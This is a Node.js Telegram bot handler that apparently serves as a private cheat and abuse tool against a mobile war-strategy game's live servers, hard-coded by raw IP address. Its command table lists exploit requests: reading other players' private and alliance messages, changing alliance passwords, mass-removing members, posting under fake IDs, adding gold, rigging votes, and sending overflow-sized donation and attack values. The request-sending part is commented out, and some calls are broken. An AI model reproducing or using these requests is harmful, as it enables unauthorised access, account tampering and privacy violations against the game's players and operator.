// https://github.com/yagop/node-telegram-bot-api/issues/319#issuecomment-324963294
// Fixes an error with Promise cancellation
process.env.NTBA_FIX_319 = 'test';
const server = "https://telegrambot-demo.vercel.app"
// Require our Telegram helper package
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
let root = "http://54.69.99.65:8089";

const allowed_users = ["bitterbyte", "swatshield", "techycorp", "rj_767", "god_father_ishere", "always_peacefull",
    "i_am_time_traveler_of_game", "groupanonymousbot"];

const user_access = {
    'bitterbyte': ['cd', 'ald', 'rfal', 'jal', 'aldwm', 'r99fal', 'rfalrgt', 'pmocnt', 'pmoc', 'galr', 'sifwar2iar1',
        'pmoal', 'gwocnt', 'tdow', 'sm2cnt', 'upalpass', 'bckal', 'agcamo', 'magicd', 'donate', 'secrets',
        'sm2cntbyfakeid', 'carmy', 'sm2c', 'atktoc', 'refer', 'alsummary', 'addbrands', 'accesscontrol',
        'voteno2res', 'getres', 'referv2', 'voteyes2res', 'magicdminus'],
    'swatshield': ['cd', 'ald', 'rfal', 'jal', 'aldwm', 'r99fal', 'rfalrgt', 'pmocnt', 'pmoc', 'galr', 'sifwar2iar1',
        'pmoal', 'gwocnt', 'tdow', 'sm2cnt', 'upalpass', 'bckal', 'agcamo', 'magicd', 'donate', 'secrets',
        'sm2cntbyfakeid', 'carmy', 'sm2c', 'atktoc', 'refer', 'alsummary', 'addbrands', 'accesscontrol',
        'voteno2res', 'getres', 'referv2', 'voteyes2res', 'magicdminus'],
    "god_father_ishere": ['cd', 'ald', 'rfal', 'jal', 'aldwm', 'r99fal', 'rfalrgt', 'pmocnt', 'pmoc', 'galr',
        'sifwar2iar1', 'pmoal', 'gwocnt', 'tdow', 'upalpass', 'sm2cnt', 'bckal', 'agcamo', 'magicd',
        'secrets', 'sm2cntbyfakeid', 'carmy', 'sm2c', 'atktoc', 'refer', 'alsummary', 'addbrands',
        'voteno2res', 'getres', 'voteyes2res', 'magicdminus'],
    "techycorp": ['cd', 'ald', 'rfal', 'jal', 'aldwm', 'r99fal', 'rfalrgt', 'pmocnt', 'pmoc', 'galr',
        'sifwar2iar1', 'pmoal', 'gwocnt', 'tdow', 'sm2cnt', 'upalpass', 'bckal', 'agcamo', 'magicd',
        'secrets', 'sm2cntbyfakeid', 'carmy', 'sm2c', 'atktoc', 'refer', 'alsummary', 'addbrands',
        'voteno2res', 'getres', 'voteyes2res', 'donate', 'magicdminus'],
    "rj_767": ['cd', 'ald', 'rfal', 'jal', 'aldwm', 'r99fal', 'rfalrgt', 'pmocnt', 'pmoc', 'galr', 'sifwar2iar1',
        'pmoal', 'gwocnt', 'tdow', 'sm2cnt', 'upalpass', 'bckal', 'agcamo', 'magicd', 'sm2cntbyfakeid', 'carmy',
        'sm2c', 'atktoc', 'refer', 'alsummary', 'addbrands', 'voteno2res', 'getres', 'voteyes2res', 'magicdminus'],
    "always_peacefull": ['cd', 'ald', 'aldwm', 'pmocnt', 'galr', 'pmoc', 'pmoal', 'carmy', 'sm2c', 'atktoc', 'refer', 'voteno2res', 'getres', 'voteyes2res'],
    "i_am_time_traveler_of_game": ['cd', 'ald', 'aldwm', 'pmocnt', 'galr', 'pmoc', 'pmoal', 'carmy', 'sm2c', 'atktoc', 'refer', 'gwocnt', 'voteno2res', 'getres', 'voteyes2res', 'donate', 'sm2cnt', 'tdow'],
    "groupanonymousbot": ['cd', 'ald', 'aldwm', 'pmocnt', 'galr', 'pmoc', 'pmoal', 'carmy', 'sm2c', 'atktoc', 'refer', 'gwocnt', 'voteno2res', 'getres', 'voteyes2res', 'accesscontrol']
}

const headers = { 'User-Agent': 'android-async-http/1.4.4 (http://loopj.com/android-async-http)' }
const headers2 = { 'User-Agent': 'android-async-http' }



const urls = {
    'cd': '/RestSimulator?Operation=getUserData&company_id={CID}',
    'ald': '/RestSimulator?Operation=getAllianceDetails&alliance_id={AID}',
    'rfal': '/RestSimulator?Operation=leaveAlliance&alliance_id={AID}&company_id={CID}',
    'jal': '/RestSimulator?Operation=joinAlliance&alliance_id={AID}&alliance_joined_id={CID}',
    'aldwm': '/RestSimulator?Operation=getAllianceDetails&alliance_id={AID}',
    'r99fal': '/RestSimulator?Operation=getAllianceDetails&alliance_id={AID}',
    'allMem': '/RestSimulator?Operation=getUpdates&company_id={CID}',
    'rfalrgt': '/RestSimulator?Operation=getAllianceDetails&alliance_id={AID}',
    'pmocnt': '/RestSimulator?Operation=fetcCountryChatMessages&chat_message_id=0&country={CNT}',
    'pmoc': '/RestSimulator?Operation=getUpdates&company_id={CID}',
    'galr': '/RestSimulator?Operation=getAlliancesRankings',
    'sifwar2iar1': '/RestSimulator?Operation=InviteToAlliance&alliance_id=80994&alliance_name=Indian Attackers Realm&inviting_user_id=2230021&inviting_user_name=W.A.R&invited_user_id={CID}',
    'pmoal': '/RestSimulator?Operation=getAllianceMessages&alliance_id={AID}',
    'gwocnt': '/RestSimulator?Operation=getWarsByCountry&country={CNT}',
    'tdow': '/wars/{WID}/contributors?country={CNT}&size={N}',
    'sm2cnt': '/RestSimulator?Operation=insertToCountryChatMessages&company_id={CID}&country={CNT}&company_name={CN}&chat_type=0&message_text={MSG}',
    'sm2cntbyfakeid': '/RestSimulator?Operation=insertToCountryChatMessages&company_id={CID}&country={CNT}&company_name={CN}&chat_type=0&message_text={MSG}',
    'bckal': '/RestSimulator?Operation=getAllianceDetails&alliance_id={AID}',
    'agcamo': '/RestSimulator?Operation=checkForBackup&company_id={CID}&email={EM}',
    'magicd': '/RestSimulator?Operation=postDonation&country={CNT}&donation_sum=-9223372036854775807&donation_type=0&company_name=&war_id={WID}&company_id=&available_patriotism=-1',
    'magicdminus': '/RestSimulator?Operation=postDonation&country={CNT}&donation_sum=-922337203685&donation_type=0&company_name=&war_id={WID}&company_id=&available_patriotism=1',
    'backUpUrl': '/RestSimulator',
    'donate': '/RestSimulator?Operation=postDonation&country={CNT}&donation_sum={DON}&donation_type=0&war_id={WID}&company_id={CID}&company_name={CN}&available_patriotism=0',
    'upalpass': '/RestSimulator?Operation=updateAlliance&alliance_id={AID}&alliance_name={AN}&alliance_slogan={ALS}&alliance_country={AC}&same_country={SCF}&pass={PA}',
    'carmy': '/RestSimulator?Operation=getUserArmy&company_id={CID}',
    'sm2c': '/RestSimulator?Operation=InsertToMessagesTable&company_id={TOCID}&company_name={TOCN}&sending_company_id={CID}&sending_company_name={CN}&message_text={MSG}&date_time={DT}',
    'atktoc': '/RestSimulator?Operation=ArmyAttack&company_id={CID}&company_name={CN}&attacked_company_id={ACID}&attacked_company_name={ACN}&attack_type={AT}&attack_strength=9199999999999999999&level={FLVL}&date_time={DT}',
    'refer': '/RestSimulator?Operation=RegisterUser',
    'referv2': '/RestSimulator?Operation=RegisterUser',
    'alsummary': '/RestSimulator?Operation=getAllianceDetails&alliance_id={AID}',
    'addbrands': '/RestSimulator?Operation=checkForBackup&company_id={CID}&email={EM}',
    'accesscontrol': 'accesscontrol',
    'voteno2res': '/RestSimulator?Operation=voteOnResolution&resolution_id={RID}&resolution_vote=0',
    'voteyes2res': '/RestSimulator?Operation=voteOnResolution&resolution_id={RID}&resolution_vote=1',
    'getres': '/RestSimulator?Operation=getActiveResolutions&country={CNT}',
    'secrets': 'list_of_secrets'
}
const secrets = {
    'cd:company_id': 'company details by id',
    'ald:alliance_id': 'alliance details by id',
    'rfal:alliance_id,company_id': 'remove a company from alliance',
    'jal:alliance_id,company_id': 'join a company in an alliance',
    'aldwm:alliance_id,member_id': 'alliance details with members , when alliance does not have owner',
    'r99fal:alliance_id': 'remove all 99999 players from an alliance',
    'rfalrgt:alliance_id,rank': 'remove all players from an alliance who has rank more than the given rank',
    'pmocnt:country_name': 'country message read',
    'pmoc:company_id': 'private message of a company',
    'galr': 'get Alliances Rankings',
    'sifwar2iar1:company_id': 'send invite from W.A.R id to join alliance IAR 1',
    'pmoal:alliance_id': 'private message of an alliance',
    'gwocnt:country_name': 'get all wars details of a country',
    'tdow:country_name,war_id,list_size': 'top donators of a war for given war id, country and size of donators',
    "sm2cnt:country_name|company_id|message": "Send message to country",
    "sm2cntbyfakeid:country_name|company_id|company_name|message": "Send message to country",
    "bckal:alliance_id": "Get back up of all members of given alliance rank wise",
    "agcamo:company_id,email,gold_coins,money": "add gold coins and money. After this you need to restore the game",
    "magicd:country_name,war_id": "magic donation",
    "magicdminus:country_name,war_id": "minus magic donation",
    "donate:country_name,war_id,company_id,number_of_donations": "donation to a war via company id and num of donations",
    "upalpass:alliance_id,new_pass": "Change password of an alliance",
    "carmy:company_id": "Get company army",
    "sm2c:from_company_id|to_company_id|message": "Send message to a company",
    "atktoc:from_company_id,to_company_id,attack_type": "Attack to a company",
    "refer:count_to_generate": "Generate referral",
    "addbrands:company_id,email_id,brand_points_to_add": "add brand points",
    "alsummary:alliance_id,member_id,should_bypass_owner": "Get alliance details with level matrix, pass member id and 1 if alliance doesnt have owner",
    "voteno2res:red_id,no_of_votes": "vote no to res",
    "voteyes2res:red_id,no_of_votes": "vote yes to res",
    "getres:country_name": "get resolution by country_name",
    "secrets:all": "get list of all secrets, all word is mandatory"
}


// Export as an asynchronous function
// We'll wait until we've responded to the user
module.exports = async (request, response) => {
    try {
        // Create our new bot handler with the token
        // that the Botfather gave us
        // Use an environment variable so we don't expose it in our code
        const bot = new TelegramBot(process.env.TELEGRAM_TOKEN);

        // Retrieve the POST request body that gets sent from Telegram
        const { body } = request;

        // Ensure that this is a message being sent
        if (body.message) {
            // Retrieve the ID for this chat
            // and the text that the user sent
            // const { chat: { id }, text } = body.message;
            const { message_id, from: { username }, chat: { id }, text } = body.message;

            if (text.startsWith('c2VjcmV0')) {
                const user = username.toLowerCase();

                if (!allowed_users.hasOwnProperty(user)) {
                    bot.sendMessage(id, `${username} not allowed`, { parse_mode: 'Markdown', reply_to_message_id: message_id });
                    return;
                }
                let req_string = text.split("---");

                if (req_string[0].endswith('bt4')) {
                    root = "http://52.24.104.170:8089"
                } else {
                    root = "http://54.69.99.65:8089"
                }
                let inputMap = req_string[1].split(":")
                let urlCode = inputMap[0];
                let value = inputMap[1];

                if (!user_access[user].contains(urlCode) || !urls.hasOwnProperty(urlCode)) {
                    bot.sendMessage(id, "You dont have permission for this command", { parse_mode: 'Markdown', reply_to_message_id: message_id });
                    return;
                }
                let actionUrl = root + urls[urlCode];

                if (urlCode === 'secrets') {
                    let newData = getSecrets();
                    bot.sendMessage(id, newData, { parse_mode: 'Markdown', reply_to_message_id: message_id });
                    return;
                }


                // let msg = text + "!!!" + username.toLowerCase();
                // let reqUrl = `${server}/${msg}`
                // axios.get(reqUrl)
                //     .then(response => {
                //         const message = response && response.data || "error from axios";
                //         // Send our new message back in Markdown
                //         // console.log(response.substr(0,20));
                //         bot.sendMessage(id, message, { parse_mode: 'Markdown', reply_to_message_id: message_id });
                //         // console.log(response.data.url);
                //         // console.log(response.data.explanation);
                //     })
                //     .catch(error => {
                //         console.log(error);
                //         bot.sendMessage(id, error.message, { parse_mode: 'Markdown', reply_to_message_id: message_id });
                //     });

                // Create a message to send back
                // We can use Markdown inside this
                // await bot.sendMessage(id, reqUrl, { parse_mode: 'Markdown', reply_to_message_id: message_id });

            }
        }
    }
    catch (error) {
        // If there was an error sending our message then we 
        // can log it into the Vercel console
        console.error('Error sending message');
        console.log(error.toString());
    }

    // Acknowledge the message with Telegram
    // by sending a 200 HTTP status code
    response.send('OK');
};

function getSecrets() {
    let data = secrets
    let res = "==========================================\nSecrets\n==========================================";
    Object.keys(data).forEach(function (k) {
        res = res + "\n`" + k + "`\n\n" + data[k] + "\n------------------------\n\n"
    });

    return res;

}
